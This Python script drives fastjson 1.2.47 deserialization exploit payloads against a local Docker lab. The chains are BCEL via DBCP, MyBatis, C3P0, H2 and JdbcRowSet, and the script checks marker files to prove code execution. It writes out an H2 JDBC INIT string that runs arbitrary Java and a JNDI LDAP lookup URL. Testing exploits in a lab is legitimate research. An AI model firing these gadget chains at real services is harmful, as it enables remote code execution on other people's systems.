"""在 fastjson-1247-lab 上验证 BCEL / C3P0 / MyBatis / H2 / JdbcRowSet 证明 payload。"""

from __future__ import annotations

import base64
import json
import subprocess
import sys
import time
from pathlib import Path

import httpx

from fastjson_toolkit.poc.v1_2_47.encode import bcel_code_from_class_bytes
from fastjson_toolkit.poc.v1_2_47.payloads import (
    build_bcel_commons_dbcp,
    build_bcel_commons_dbcp2,
    build_bcel_tomcat_dbcp,
    build_bcel_tomcat_dbcp2,
    build_c3p0_wrapper,
    build_h2_jdbc,
    build_jdbc_rowset,
    build_mybatis_bcel,
)

ROOT = Path(__file__).resolve().parents[1]
LAB = ROOT / "lab" / "fastjson-1247-lab"
PROOF = ROOT / "tmp_lab" / "1247_proof"
BASE = "http://127.0.0.1:18147"
CONTAINER = "fastjson-1247-lab"


def sh(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, check=True, text=True, capture_output=True, **kwargs)


def wait_health(seconds: int = 120) -> dict:
    deadline = time.time() + seconds
    last = ""
    while time.time() < deadline:
        try:
            with httpx.Client(timeout=3.0, trust_env=False) as c:
                r = c.get(f"{BASE}/api/health")
                if r.status_code == 200:
                    return r.json()
                last = r.text
        except Exception as exc:  # noqa: BLE001
            last = str(exc)
        time.sleep(1.5)
    raise RuntimeError(f"health timeout: {last}")


def clear_markers() -> None:
    with httpx.Client(timeout=5.0, trust_env=False) as c:
        c.request("DELETE", f"{BASE}/api/markers")


def get_markers() -> dict:
    with httpx.Client(timeout=5.0, trust_env=False) as c:
        return c.get(f"{BASE}/api/markers").json()["markers"]


def post_payload(body: str, timeout: float = 20.0) -> tuple[int, str]:
    with httpx.Client(timeout=timeout, trust_env=False) as c:
        r = c.post(
            f"{BASE}/api/fastjson",
            content=body.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        return r.status_code, r.text[:500]


def docker_cp(src_in_container: str, dest: Path) -> None:
    dest.parent.mkdir(parents=True, exist_ok=True)
    sh(["docker", "cp", f"{CONTAINER}:{src_in_container}", str(dest)])


def ensure_lab() -> dict:
    print("[*] docker compose up --build -d")
    subprocess.run(
        ["docker", "compose", "up", "--build", "-d"],
        cwd=str(LAB),
        check=True,
    )
    info = wait_health()
    print("[*] health", json.dumps(info, ensure_ascii=False))
    if not info.get("bcel_classloader"):
        raise RuntimeError("靶场 JDK 无 BCEL ClassLoader（需要 <=8u251）")
    return info


def load_proof_assets() -> tuple[bytes, bytes, str]:
    PROOF.mkdir(parents=True, exist_ok=True)
    bcel_path = PROOF / "BcelProbe.class"
    evil_path = PROOF / "EvilH2.class"
    hex_path = PROOF / "c3p0-proof.hex"
    docker_cp("/app/proof/BcelProbe.class", bcel_path)
    docker_cp("/app/proof/EvilH2.class", evil_path)
    docker_cp("/app/proof/c3p0-proof.hex", hex_path)
    bcel_bytes = bcel_path.read_bytes()
    evil_bytes = evil_path.read_bytes()
    hex_ascii = hex_path.read_text(encoding="ascii").strip()
    assert bcel_bytes.startswith(b"\xca\xfe\xba\xbe"), "bad BcelProbe.class"
    assert evil_bytes.startswith(b"\xca\xfe\xba\xbe"), "bad EvilH2.class"
    assert hex_ascii.startswith("ACED"), "bad c3p0 hex"
    return bcel_bytes, evil_bytes, hex_ascii


def expect_marker(key: str) -> bool:
    markers = get_markers()
    ok = bool(markers.get(key, {}).get("exists"))
    print(f"    marker {key}: {markers.get(key)}")
    return ok


def main() -> int:
    ensure_lab()
    # 重启以清空已加载的 H2Probe（避免 defineClass LinkageError）
    subprocess.check_call(["docker", "restart", CONTAINER])
    wait_health()

    bcel_bytes, evil_bytes, c3p0_hex = load_proof_assets()
    bcel = bcel_code_from_class_bytes(bcel_bytes)
    evil_b64 = base64.b64encode(evil_bytes).decode("ascii")

    # Class.forName 路径（classpath 上有 H2Probe）；defineClass 路径用 EvilH2（不在 jar 内）
    h2_forname = (
        "jdbc:h2:mem:t1;INIT="
        "CREATE ALIAS EXEC AS 'void exec() throws Exception { "
        "Class.forName(\"com.fastjsonlab.H2Probe\")\\; }'\\;"
        "CALL EXEC()\\;"
    )

    cases: list[tuple[str, str, str]] = [
        ("jdbc_rowset", build_jdbc_rowset("ldap://host.docker.internal:13999/x"), ""),
        ("bcel_tomcat_dbcp", build_bcel_tomcat_dbcp(bcel), "fj1247_bcel"),
        ("bcel_tomcat_dbcp2", build_bcel_tomcat_dbcp2(bcel), "fj1247_bcel"),
        ("bcel_commons_dbcp", build_bcel_commons_dbcp(bcel), "fj1247_bcel"),
        ("bcel_commons_dbcp2", build_bcel_commons_dbcp2(bcel), "fj1247_bcel"),
        ("mybatis_bcel", build_mybatis_bcel(bcel), "fj1247_bcel"),
        ("c3p0_wrapper", build_c3p0_wrapper(f"HexAsciiSerializedMap:{c3p0_hex};"), "fj1247_c3p0"),
        ("h2_jdbc_forname", build_h2_jdbc(h2_url=h2_forname), "fj1247_h2"),
        ("h2_jdbc_define", build_h2_jdbc(class_b64=evil_b64), "fj1247_h2"),
    ]

    results: dict[str, str] = {}
    for name, payload, marker in cases:
        clear_markers()
        (PROOF / f"{name}.json").write_text(payload, encoding="utf-8")
        print(f"[*] {name}  payload={len(payload)} bytes")
        code, text = post_payload(payload)
        print(f"    http={code} {text[:180]}")
        if not marker:
            # JdbcRowSet：不要求落盘，只要不是冷启动直打那种纯黑名单形态；
            # 有 Class 预热时 400（JNDI）或 200 都可
            results[name] = "PASS" if code in (200, 400) else "FAIL"
            continue
        time.sleep(0.3)
        results[name] = "PASS" if expect_marker(marker) else "FAIL"

    print("SUMMARY", json.dumps(results, ensure_ascii=False, indent=2))
    failed = [k for k, v in results.items() if v != "PASS"]
    if failed:
        print("[!] failed:", ", ".join(failed))
        return 1
    print("[+] all gadget proofs passed on fastjson-1247-lab")
    return 0


if __name__ == "__main__":
    sys.exit(main())
